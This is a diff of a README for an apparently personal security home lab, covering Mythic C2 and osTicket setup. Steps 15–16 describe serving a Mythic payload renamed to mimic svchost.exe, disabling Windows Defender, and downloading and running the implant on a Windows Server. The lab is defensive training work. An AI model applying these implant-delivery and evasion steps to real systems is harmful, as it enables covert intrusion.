@@ -83,8 +83,8 @@ Configuration Management Tools: To automate the deployment and configuration of 
 *Ref 20: Mythic agent and profile*<br>
 ![Mythic active callback](https://github.com/user-attachments/assets/114ebab0-2ff4-48ed-b5c6-09cbe672254b)<br>
 *Ref 21: Mythic active callback*<br>
-15. In the Mythic VM cd into home directory > wget <link address>; change 8443 to 744. and ip to the mythic vm ip nad --no-check-certificate > mv <file> svchost-<make a filename>.exe < python3 -m http.server 9999
-16. Disable Windows Defender on the Windows Server and add an exclusion for the Downloads Folder. In PowerShell invoke-webrequest -uri http://<mythic vm ip address>:9999/svchost-<filename>.exe -Outfile "(:\Users\Administrator\Downloads\svchost-<filename>.exe" > run the file thats in downloads.
+15. In the Mythic VM cd into home directory > wget <-link address>; change 8443 to 744. and ip to the mythic vm ip nad --no-check-certificate > mv <file> svchost-<make a filename>.exe < python3 -m http.server 9999
+16. Disable Windows Defender on the Windows Server and add an exclusion for the Downloads Folder. In PowerShell invoke-webrequest -uri http://<-mythic vm ip address>:9999/svchost-<filename>.exe -Outfile "(:\Users\Administrator\Downloads\svchost-<filename>.exe" > run the file thats in downloads.
 17. Spin up your osTicket VM. Download <a href="https://www.apachefriends.org/download.html">xampp</a> by apache and <a href="https://osticket.com/">osTicket</a>. Click on xampp to install it. Extract all of the osTicket download after you extract the osticket zip in that folder.
 ![osTicket download](https://github.com/user-attachments/assets/2f9da10e-cc8d-4779-8662-51d54f098e22)<br>
 *Ref 22: osTicket download*<br>
@@ -93,4 +93,8 @@ Configuration Management Tools: To automate the deployment and configuration of 
 20. Navigate to phpMyAdmin folder > make a back of config.inc.php file, open original in notepad > change password of user-root to the one you just created, and add the ip address of the osTicket VM (make sure login hos is your VM ip). Go back to user accounts > root account > databases > select your database under "Add privileges..." > Go > check all > Go.
  ![config inc](https://github.com/user-attachments/assets/c1a85f1b-c435-46a9-99d0-d7142755f0f5)<br>
 *Ref 23: config.inc*<br>
-21. Navigate to osTicket folder you extracted > copy the "scripts" and "upload" folders and paste into a new folder you create called "osticket" in the htdocs folder under the xampp folder. Access the server/installer in a browser with <VM ip>/osticket/upload" > continue > go back to the upload folder in htdocs > include > rename ost-sampleconfig.php to ost-config.php > back to broswerm click continue > fill out the form; use the mysql database you created > 
+21. Navigate to osTicket folder you extracted > copy the "scripts" and "upload" folders and paste into a new folder you create called "osticket" in the htdocs folder under the xampp folder. Access the server/installer in a browser with <-VM ip address >/osticket/upload" > continue > go back to the upload folder in htdocs > include > rename ost-sampleconfig.php to ost-config.php > back to broswer, click continue > fill out the form; use the mysql database you created > click install now, Access system with staff control panel link.<br>
+![osticket installer](https://github.com/user-attachments/assets/49bc3fca-1936-41cf-a500-e3de6d48641f)<br>
+*Ref 24: osticket installer*<br>
+![osticket install form](https://github.com/user-attachments/assets/3b391cd2-5e8d-49e7-8aca-502bcc0d4031)<br>
+*Ref 25: osticket install form*<br>
